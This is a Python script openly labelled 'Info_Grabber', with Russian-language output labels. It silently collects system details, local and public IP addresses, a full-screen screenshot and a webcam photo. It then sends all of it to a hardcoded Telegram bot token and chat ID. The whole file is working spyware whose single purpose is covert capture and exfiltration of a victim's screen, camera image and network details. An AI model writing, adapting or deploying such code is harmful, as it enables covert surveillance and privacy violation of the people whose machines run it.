"""

            📦 Продукт: Info_Grabber
            ✨ Автор: @govno_coder_ot_kota
            🎃 Лицензия: MIT license

"""

import platform
import cpuinfo
import socket
import requests
from PIL import ImageGrab, Image
import io
import json
import cv2

def ScreenGrab():
    img = ImageGrab.grab(all_screens=True)
    buf = io.BytesIO(); img.save(buf, format='PNG'); buf.seek(0)
    return buf

def WebcamGrab():
    cap = cv2.VideoCapture(0)
    _, frame = cap.read()
    cap.release()
    img = Image.fromarray(cv2.cvtColor(frame, cv2.COLOR_BGR2RGB))
    buf = io.BytesIO(); img.save(buf, format="PNG"); buf.seek(0)
    return buf

def GetIP():
    local = socket.gethostbyname( socket.gethostname() )
    get = socket.socket(socket.AF_INET, socket.SOCK_DGRAM); get.connect(('8.8.8.8', 80))
    google = get.getsockname()[0]
    public = requests.get('https://api.ipify.org').text
    return local, google, public

def GetSystem():
    uname = platform.uname()
    lhost, google, public = GetIP()
    out = f"====| Система |====\n"
    out += f"🎃 Система: {uname.system} {uname.release}\n"
    out += f"⚙ Архитектура: {cpuinfo.get_cpu_info()['arch']}\n"
    out += f"📦 Процессор: {cpuinfo.get_cpu_info()['brand_raw']}\n"
    out += f"====| Интернет |====\n"
    out += f"💻 Локальный: {google}, {lhost}\n"
    out += f"🌎 Внешний: {public}\n"
    out += f"====| Питон |====\n"
    out += f"🐍 Версия Python: {platform.python_version()}\n"
    return out

if __name__ == '__main__':
    info = GetSystem()
    desktop = ScreenGrab()
    webcam = WebcamGrab()

    TOKEN = "7539990102:AAFCEwvXc2yzf-FUD-UD8vH_uHM1Vfoo_NA"
    CHAT_ID = 1320559926

    # send
    r= requests.post(f'https://api.telegram.org/bot{TOKEN}/sendMediaGroup', 
                  data={'chat_id': CHAT_ID, 'caption': info,'media': json.dumps([
                        {'type': 'photo', 'media': 'attach://desktop'}, 
                        {'type': 'photo', 'media': 'attach://webcam', 'caption': info}
                      ])}, 
                  files={
                      'desktop': desktop,
                      'webcam': webcam
                  })
